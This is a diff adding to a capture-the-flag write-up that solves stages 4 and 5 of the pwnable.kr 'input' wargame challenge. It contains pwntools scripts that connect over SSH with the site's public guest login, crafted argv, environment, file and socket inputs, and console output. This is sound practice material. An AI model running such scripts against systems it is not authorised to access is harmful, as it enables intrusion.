@@ -144,3 +144,113 @@ Stage 2 clear!
 Stage 3 clear!
 [*] Got EOF while reading in interactive
 ```
+
+For stage 4 we need to read from a file. We can change our cwd using pwntools and use relative paths to create a file. We truncate to remove the newline added by cat.
+
+```
+from pwn import *
+import os
+s = ssh(host='pwnable.kr',
+        user='input2',
+        password='guest',
+        port=2222)
+  
+arr = [b'\x00']*100
+arr[0] = 'input'
+arr[66] = b'\x20\x0a\x0d'
+
+p = s.process(['cat', '-'], stdout='/tmp/huck/stderr')
+p.sendline(b'\x00\x0a\x02\xff')
+p.kill()
+
+p = s.process(['cat', '-'], stdout=b'/tmp/huck/\x0a')
+p.sendline(b'\x00'*4) 
+p.kill()
+
+p = s.process(['truncate', '-s-1', '/tmp/huck/\x0a'])
+
+p = s.process(arr, stderr='/tmp/huck/stderr', env={b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'}, cwd="/tmp/huck/");
+p.sendline(b'\x00\x0a\x00\xff')
+p.interactive()
+```
+
+```
+(ctf-python) [huck@knuth] python3 exploit.py
+[+] Connecting to pwnable.kr on port 2222: Done
+[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
+[*] Closed SSH channel with pwnable.kr
+[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
+[*] Closed SSH channel with pwnable.kr
+[+] Opening new channel: execve(b'truncate', [b'truncate', b'-s-1', b'/tmp/huck/\n'], os.environ): Done
+[+] Opening new channel: execve(b'input', [b'input', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b' \n\r', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'', b'',...: Done
+[*] Switching to interactive mode
+Welcome to pwnable.kr
+Let's see if you know how to give input to program
+Just give me correct inputs then you will get the flag :)
+Stage 1 clear!
+Stage 2 clear!
+Stage 3 clear!
+Stage 4 clear!
+$
+```
+
+I started a new shell to connect to the server, unfortunately this didn't work because of the system() call. Although the challenge should be finished, it does not give me the flag. :(
+
+```
+from pwn import *
+import os
+s = ssh(host='pwnable.kr',
+        user='input2',
+        password='guest',
+        port=2222)
+
+sock_port = 8999;
+  
+arr = [b'\x00']*100
+arr[0] = 'input'
+arr[66] = b'\x20\x0a\x0d'
+arr[67] = str(sock_port)
+
+p = s.process(['cat', '-'], stdout='/tmp/huck/stderr')
+p.sendline(b'\x00\x0a\x02\xff')
+p.kill()
+
+p = s.process(['cat', '-'], stdout=b'/tmp/huck/\x0a') 
+p.sendline(b'\x00'*4)
+p.kill()
+
+p = s.process(['truncate', '-s-1', '/tmp/huck/\x0a'])
+
+shell = s.shell('/bin/sh', tty=True)
+p = s.process(arr, stderr='/tmp/huck/stderr', env={b'\xde\xad\xbe\xef': b'\xca\xfe\xba\xbe'}, cwd="/tmp/huck/", run=False);
+
+shell.sendline(p)
+shell.sendline(b'\x00\x0a\x00\xff')
+
+shell2 = s.shell('/bin/sh')
+shell2.sendline('python -c "print \'\\xde\\xad\\xbe\\xef\'" | nc localhost '+str(sock_port));
+
+shell.interactive()
+```
+
+```
+(ctf-python) [huck@knuth] python3 exploit.py
+[+] Connecting to pwnable.kr on port 2222: Done
+[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
+[*] Closed SSH channel with pwnable.kr
+[+] Opening new channel: execve(b'cat', [b'cat', b'-'], os.environ): Done
+[*] Closed SSH channel with pwnable.kr
+[+] Opening new channel: execve(b'truncate', [b'truncate', b'-s-1', b'/tmp/huck/\n'], os.environ): Done
+[+] Opening new channel: '/bin/sh': Done
+[*] Uploading execve script to /tmp/pwnlib-execve-RImVzCgr9f
+[+] Opening new channel: '/bin/sh': Done
+[*] Switching to interactive mode
+$ Welcome to pwnable.kr
+Let's see if you know how to give input to program
+Just give me correct inputs then you will get the flag :)
+Stage 1 clear!
+Stage 2 clear!
+Stage 3 clear!
+Stage 4 clear!
+Stage 5 clear!
+```
